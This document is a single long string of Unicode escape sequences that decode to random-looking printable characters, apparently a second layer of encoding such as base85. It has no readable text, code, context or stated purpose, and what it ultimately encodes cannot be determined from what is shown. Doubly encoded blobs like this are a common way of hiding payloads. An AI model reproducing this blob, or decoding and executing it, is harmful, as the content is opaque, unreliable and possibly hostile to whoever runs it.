\u0073\u0029\u002e\u006e\u007a\u003c\u005b\u005e\u005e\u0073\u004f\u005f\u0048\u0038\u003d\u0064\u0025\u002f\u0065\u0064\u0043\u0043\u0068\u0035\u0058\u0050\u0041\u0044\u004f\u0026\u0049\u006d\u0056\u0057\u0046\u005a\u0049\u0037\u004a\u0051\u003c\u0047\u005b\u002f\u007c\u006d\u0072\u004c\u006c\u0063\u0045\u004f\u0048\u003b\u0023\u0050\u007c\u0076\u002b\u005a\u0023\u0054\u006c\u0056\u0074\u003a\u0078\u0074\u0066\u0038\u0030\u002a\u0022\u0063\u0058\u0047\u0046\u002b\u002b\u002c\u0032\u0048\u002f\u0028\u002e\u0043\u004f\u0060\u005b\u0072\u0077\u007a\u0054\u006f\u0062\u0061\u0049\u0075\u0070\u007c\u004c\u005b\u0021\u0077\u0067\u0023\u0072\u0076\u006f\u004c\u0056\u002c\u003c\u0041\u003f\u007e\u0054\u0026\u002c\u0078\u004a\u0059\u0079\u0053\u0035\u0050\u0073\u0028\u0021\u0064\u0029\u0023\u006f\u0031\u0033\u0052\u004f\u0043\u0042\u005f\u0038\u0032\u004f\u002a\u003d\u0076\u0061\u0047\u0026\u0021\u004f\u0074\u0072\u003d\u003f\u0077\u004f\u0026\u005f\u0046\u004c\u0061\u0069\u0051\u0063\u007a\u0054\u0023\u007d\u003a\u0066\u0046\u0026\u0047\u0030\u0041\u002b\u0056\u0056\u0053\u003a\u006f\u0021\u0025\u0024\u0053\u0079\u007d\u0031\u004f\u0073\u007e\u0026\u0032\u0046\u0045\u002a\u0079\u0039\u0062\u0047\u006e\u0025\u0071\u002f\u0036\u0040\u006f\u005d\u005b\u0052\u0048\u0069\u0076\u0063\u0046\u004d\u0039\u002c\u0056\u005f\u0048\u004c\u003c\u0033\u0048\u0059\u004c\u0060\u0068\u0035\u0033\u004c\u006f\u0030\u004c\u0063\u0079\u0072\u0050\u0035\u0062\u002e\u0026\u0058\u0031\u004c\u007d\u0033\u0050\u005d\u0028\u0064\u003c\u0034\u0062\u007d\u0075\u0062\u0041\u002b\u0032\u0039\u004b\u0077\u007a\u005d\u006b\u004a\u0028\u0044\u0025\u0036\u0075\u0075\u0029\u006b\u004c\u0059\u003c\u005f\u0046\u0031\u005f\u0024\u0074\u007d\u007c\u0065\u004c\u0033\u0077\u0030\u0047\u0047\u0044\u0057\u006f\u004e\u0034\u0036\u0036\u002b\u006f\u0044\u006e\u006e\u0033\u0031\u0070\u004f\u004a\u006f\u002b\u0075\u002a\u006e\u0060\u0044\u0076\u004c\u0075\u003c\u0074\u0077\u0031\u003b\u007b\u004e\u0059\u006a\u0076\u0035\u0038\u0026\u006c\u0035\u0021\u002f\u0032\u0021\u0054\u004b\u005e\u0068\u0054\u0072\u003e\u0036\u0022\u0022\u0077\u0059\u0042\u002a\u0032\u003a\u0058\u0063\u0079\u0048\u0054\u0070\u0021\u0060\u0058\u006b\u007b\u004e\u005e\u0053\u0051\u0075\u007c\u0066\u0045\u007e\u0077\u0074\u006a\u004c\u0036\u003d\u002a\u0028\u0057\u0061\u007b\u0025\u0067\u0056\u0060\u0038\u002b\u002b\u0050\u0063\u006b\u0024\u003e\u005e\u006e\u0052\u007b\u0025\u006b\u002f\u0049\u002c\u006b\u0067\u007c\u0070\u004a\u005f\u005e\u0078\u007d\u003f\u0067\u0066\u0052\u0066\u007a\u004e\u0038\u003b\u0063\u0029\u0036\u0025\u007a\u0070\u0078\u0026\u003d\u0051\u0042\u002f\u0042\u005d\u0031\u003e\u003a\u0048\u005e\u0071\u0065\u0024\u0075\u0056\u004a\u006b\u0047\u005f\u0039\u0059\u006d\u0055\u0057\u0045\u0045\u0053\u0030\u003b\u0052\u004d\u0021\u0079\u0029\u005f\u0039\u004a\u0066\u002e\u007c\u0061\u0061\u0026\u007e\u0059\u0048\u0056\u006e\u0032\u0043\u006b\u002f\u0064\u0072\u007b\u0063\u0053\u0057\u0032\u004f\u007b\u0060\u0029\u006d\u006b\u0059\u0023\u0054\u0065\u0075\u005e\u0063\u0057\u0024\u0042\u0079\u004d\u0065\u0034\u0058\u0069\u0058\u0064\u0079\u0024\u0046\u0071\u0038\u0053\u0062\u0068\u005b\u004e\u0061\u004f\u0071\u0077\u0070\u0054\u002e\u0067\u002a\u0074\u002b\u0032\u0047\u0069\u003f\u0052\u005e\u0049\u004b\u0041\u0063\u002b\u0042\u004b\u0063\u0051\u0052\u002a\u007b\u005b\u0042\u0059\u002f\u0061\u0060\u0077\u0046\u0028\u0051\u0052\u0077\u002a\u004d\u0058\u0061\u0068\u0033\u005e\u0028\u0021\u0035\u0054\u0025\u0076\u005e\u0022\u005b\u0044\u0032\u0023\u0038\u0065\u0035\u0050\u002b\u0067\u0076\u0067\u0030\u0052\u0062\u0032\u0078\u0030\u002a\u007a\u0046\u003c\u0028\u0057\u0046\u005d\u0021\u006d\u0026\u0023\u0041\u004e\u004e\u0035\u0074\u0038\u003c\u0035\u002f\u0066\u003a\u007c\u005a\u0078\u0041\u006f\u005d\u006f\u0021\u003b\u0029\u0029\u0050\u0066\u0043\u0067\u007c\u007e\u004a\u0036\u005b\u0072\u002f\u006d\u0037\u003a\u0073\u002a\u0050\u0073\u0044\u003a\u003c\u0050\u0034\u0060\u0044\u0053\u004c\u0032\u007d\u0024\u004e\u002f\u0067\u003e\u0058\u0023\u0053\u0074\u0021\u002c\u0025\u0044\u005b\u004c\u003f\u0043\u005b\u004b\u007d\u0025\u0073\u0033\u0067\u0073\u005a\u0038\u004c\u0076\u0079\u007b\u0032\u0036\u0040\u0029\u0047\u0044\u0025\u0052\u007e\u0024\u0065\u0025\u0075\u003b\u0029\u005e\u0066\u0054\u0061\u007a\u0078\u0062\u0037\u0061\u0058\u0050\u0050\u0047\u007d\u002b\u0057\u0050\u0051\u006d\u004a\u007e\u0029\u003e\u0048\u0072\u0079\u005b\u005b\u0077\u002f\u005a\u006f\u0066\u002c\u002f\u0054\u0070\u0060\u0060\u0074\u0062\u005a\u0025\u003d\u005b\u0057\u0055\u0038\u0047\u0045\u0065\u007d\u003d\u0072\u0052\u0062\u0064\u005d\u0043\u007a\u0045\u0022\u0073\u002e\u0068\u002a\u006e\u0063\u0038\u0024\u0072\u007a\u0052\u0031\u0056\u004f\u0063\u0034\u006e\u0063\u0043\u0070\u006f\u0073\u005b\u006c\u007e\u006d\u002f\u0056\u0075\u0074\u003a\u0049\u007b\u0044\u0021\u005f\u007a\u0064\u0067\u003c\u003c\u0050\u0031\u004f\u0078\u0038\u0050\u004a\u0041\u0073\u0048\u005f\u005a\u0043\u0068\u0070\u0053\u0026\u0065\u0041\u0022\u0051\u006b\u0038\u002c\u0025\u0034\u0069\u0056\u0041\u006e\u0060\u0077\u0036\u0036\u004f\u0051\u0066\u0037\u006c\u007e\u0024\u0028\u004a\u0068\u003d\u0074\u006f\u0033\u0075\u003e\u0077\u004f\u007b\u006f\u004c\u0056\u0026\u002c\u0048\u006b\u0050\u0040\u004d\u003d\u004e\u0029\u003a\u005b\u0053\u0033\u0032\u004d\u0042\u006f\u0026\u006b\u0076\u0037\u004c\u0073\u0056\u002c\u0077\u005b\u004c\u0077\u0037\u007c\u0055\u0045\u0064\u0037\u0031\u0040\u0075\u0025\u0043\u0021\u0026\u0044\u004a\u002b\u0040\u0073\u0024\u003f\u0069\u0037\u002a\u0079\u004e\u0049\u0066\u006d\u002c\u0064\u0023\u0037\u0034\u0040\u004d\u003f\u0067\u0047\u0024\u0073\u0071\u0076\u007b\u002e\u002c\u0054\u003b\u003a\u0062\u0022\u0078\u003a\u004c\u0037\u0063\u0064\u0079\u0052\u0023\u006b\u0047\u0029\u0032\u002c\u007d\u0064\u0038\u0028\u0072\u0037\u0037\u0035\u0026\u005a\u0024\u007e\u0021\u0024\u007e\u002e\u0021\u0021\u0043\u006c\u0052\u0075\u007c\u0029\u0070\u007a\u004a\u0063\u0054\u0028\u006c\u004e\u0044\u0070\u005a\u002c\u0029\u005a\u0059\u007e\u004a\u0056\u002e\u0072\u0036\u0030\u003b\u0071\u0077\u0045\u0044\u0023\u006f\u0060\u003c\u0028\u0032\u003e\u0052\u0052\u005a\u0029\u0028\u0052\u0052\u0063\u005e\u006b\u0048\u0049\u0029\u0068\u0049\u0073\u0038\u002c\u005f\u0068\u0071\u0028\u0058\u0079\u006b\u0077\u0037\u0047\u0056\u006f\u0030\u0046\u006b\u0059\u0044\u005d\u004b\u0074\u002e\u007c\u0050\u0025\u002f\u0033\u004f\u0068\u0025\u0024\u0022\u006a\u004f\u0076\u0059\u002c\u003d\u0022\u002e\u0055\u006b\u0068\u0071\u002f\u0028\u006b\u0068\u002b\u003a\u007a\u006c\u0034\u0037\u004f\u006b\u006b\u0035\u005b\u005a\u0075\u002c\u0049\u002a\u006b\u0034\u0055\u0069\u004b\u0061\u0024\u0058\u007b\u0039\u007d\u0061\u0056\u0023\u002e\u0034\u006f\u004c\u0067\u0049\u0069\u0078\u0068\u0052\u005d\u0055\u0048\u002f\u006d\u0058\u0021\u005a\u0078\u0030\u0028\u0068\u0071\u0048\u006e\u005f\u006a\u0061\u0065\u0054\u0074\u006a\u007a\u004d\u005f\u0034\u0033\u0039\u004b\u0047\u004d\u004c\u0058\u0046\u0056\u0029\u0033\u0062\u007a\u0046\u0059\u0026\u0021\u0030\u0022\u002f\u003c\u004a\u004b\u0068\u0029\u007d\u006a\u0048\u005d\u006c\u0036\u006e\u005f\u002f\u006f\u006d\u0058\u0056\u0036\u004d\u0056\u0040\u0035\u0051\u0036\u0070\u005a\u0045\u0052\u0062\u0077\u0046\u0060\u003f\u0073\u004f\u006f\u0025\u003c\u0057\u003e\u005f\u0023\u0078\u004a\u0061\u005f\u0029\u003a\u0022\u0026\u007e\u004c\u002f\u0073\u002e\u005e\u0058\u004b\u006d\u003b\u006e\u0078\u0039\u0071\u0037\u0035\u0029\u0045\u0034\u0043\u0077\u0026\u0025\u0058\u0032\u004a\u0040\u0057\u0029\u003a\u004f\u0063\u002c\u0046\u0021\u0052\u002b\u0063\u0036\u0056\u007a\u0043\u0079\u0025\u0023\u0038\u004a\u0068\u007b\u007c\u0056\u0035\u0067\u0032\u007a\u006d\u0045\u0052\u0050\u004d\u0022\u0025\u0063\u0065\u0025\u0049\u006c\u0055\u007d\u0029\u0025\u0032\u0076\u0031\u006d\u002e\u0045\u003e\u0025\u0028\u0077\u0059\u0047\u0026\u007e\u0069\u0049\u0071\u004e\u0038\u0043\u0063\u0074\u0032\u0047\u0040\u007e\u0075\u0057\u0063\u0039\u0041\u0072\u0060\u0063\u0071\u0046\u0052\u0041\u006d\u0067\u0045\u007a\u0024\u0033\u0026\u006e\u0047\u004e\u0056\u0041\u0040\u0033\u0062\u006c\u0066\u007d\u0039\u0030\u004c\u0066\u002e\u0023\u002c\u0042\u0051\u005e\u0033\u004b\u006d\u0071\u0054\u0063\u007c\u0079\u0029\u0032\u007e\u0065\u0066\u0054\u0048\u003d\u0051\u0060\u004d\u0022\u006e\u005f\u0033\u006a\u0074\u007d\u0035\u0061\u0054\u004f\u0051\u006c\u0069\u0028\u0034\u0061\u0046\u003c\u0026\u0039\u0059\u0079\u003c\u0076\u007c\u0043\u0061\u0038\u0065\u006f\u002b\u007b\u0031\u005f\u004c\u002e\u006e\u006a\u0050\u0067\u0052\u007a\u0045\u004e\u007c\u003b\u005d\u004b\u0069\u0043\u0079\u002b\u0074\u0052\u0048\u0066\u0035\u0045\u0028\u0059\u004f\u0061\u0062\u0057\u003f\u006e\u003c\u006b\u003b\u006a\u0060\u0048\u0059\u005a\u0068\u003d\u0051\u0039\u006b\u0066\u007b\u0071\u0047\u006c\u0060\u0062\u0033\u0046\u006c\u004a\u005f\u007e\u0055\u0046\u0029\u006e\u004a\u0066\u0055\u007e\u0051\u0046\u0047\u0053\u0049\u007c\u0045\u003b\u0026\u005f\u004f\u004d\u007b\u0026\u0049\u0070\u0047\u0044\u0040\u007e\u005e\u006e\u0070\u003b\u0053\u004d\u0021\u0056\u003b\u0054\u003c\u0026\u002f\u0074\u0037\u0050\u0074\u0046\u0051\u0056\u002b\u003d\u0037\u0068\u0079\u003c\u0034\u0048\u0072\u0067\u007a\u006b\u0038\u0041\u0052\u002f\u0024\u0076\u006a\u0046\u0051\u0062\u0044\u0037\u004e\u005f\u0057\u0033\u0072\u006e\u003d\u0030\u0063\u0034\u0046\u0048\u004f\u0079\u0067\u0063\u0034\u004e\u0057\u005e\u0055\u0046\u004d\u0053\u002e\u002e\u007d\u003d\u0056\u0037\u004f\u0057\u0077\u0049\u0026\u0049\u004b\u0079\u0059\u006c\u0048\u004e\u0061\u0055\u0046\u0031\u007c\u0064\u0032\u0077\u0043\u007d\u0079\u0067\u0054\u0064\u005e\u007e\u0077\u0049\u002f\u007e\u003d\u0021\u005e\u002b\u005f\u0055\u0046\u004f\u0033\u0074\u0035\u0022\u002f\u0021\u002f\u0049\u0063\u0064\u0030\u0053\u0021\u003c\u007d\u0024\u0024\u002e\u0055\u0030\u002b\u005f\u0055\u0046\u0056\u007b\u0021\u0067\u0042\u0043\u0049\u007c\u0037\u004e\u0045\u0022\u004b\u007c\u007d\u0028\u0048\u007c\u006c\u0041\u006f\u0072\u005d\u0073\u0044\u002f\u0069\u0067\u0022\u0030\u0053\u0021\u003f\u0074\u0032\u005f\u0025\u007a\u0067\u0053\u0040\u007c\u0068\u0039\u0042\u0041\u0038\u004a\u003e\u0042\u0045\u003e\u0064\u002c\u0053\u0074\u0062\u007d\u0029\u0042\u0059\u0038\u0062\u0032\u0040\u0074\u0031\u0050\u0067\u0034\u003d\u006e\u0061\u0054\u007d\u0044\u0068\u0053\u002e\u0067\u006b\u004b\u0038\u0069\u004e\u0054\u0048\u005a\u006a\u0045\u0037\u0077\u007d\u0038\u0079\u0033\u006b\u0073\u0069\u0026\u0035\u007b\u0065\u007e\u0054\u0064\u0077\u0036\u0061\u007a\u0078\u006d\u004a\u0074\u003d\u0060\u006a\u0054\u0042\u0029\u0058\u0044\u0052\u0025\u007d\u004d\u0065\u003f\u0022\u0028\u003a\u002f\u005e\u007b\u0055\u003c\u0023\u0053\u004d\u004e\u006e\u0066\u0060\u0029\u006f\u002e\u0063\u0073\u002a\u0075\u007e\u0063\u0057\u002b\u002a\u0068\u0031\u005a\u004f\u0057\u0021\u0069\u0074\u0023\u0053\u004d\u004e\u006e\u0066\u0060\u0046\u0076\u004a\u0063\u0073\u002a\u0048\u0067\u003a\u004a\u006c\u003b\u0053\u007e\u003d\u0053\u0047\u0030\u0021\u0046\u005a\u002a\u0037\u005f\u0028\u003d\u006b\u0028\u005b\u004d\u004a\u004a\u006c\u003b\u0053\u007e\u003d\u0053\u006a\u0071\u0058\u0045\u005a\u002a\u0037\u0061\u002a\u004d\u0042\u003f\u004b\u004d\u0031\u0025\u0061\u002b\u002b\u006f\u0053\u0062\u004c\u0070\u003f\u004b\u004d\u0031\u0025\u0053\u0055\u0039\u0076\u004e\u0072\u0068\u006c\u0043\u0042\u005a\u006b\u004d\u0059\u002a\u006e\u004c\u0035\u004d\u002e\u0046\u0042\u002a\u0046\u0056\u0058\u0021\u0049\u0066\u002f\u0048\u0062\u0047\u003f\u002f\u006d\u0077\u002a\u0039\u0052\u003b\u0079\u0032\u002b\u0066\u002a\u0067\u0068\u0035\u0034\u0079\u005f\u007a\u0059\u0049\u0047\u0079\u007e\u0023\u002b\u002a\u0067\u0046\u0078\u0033\u004e\u0079\u003b\u0045\u007e\u0028\u002b\u005f\u0076\u0053\u005b\u0025\u0071\u003c\u003a\u0031\u0072\u0047\u0028\u002b\u0032\u006a\u004b\u0079\u004a\u0078\u004d\u0039\u0054\u0043\u0048\u0079\u0042\u003f\u0074\u0052\u0050\u0041\u006d\u002c\u0025\u0042\u0031\u005a\u004a\u004d\u0077\u0075\u005e\u006c\u0023\u002c\u006a\u0052\u006e\u0030\u0038\u004b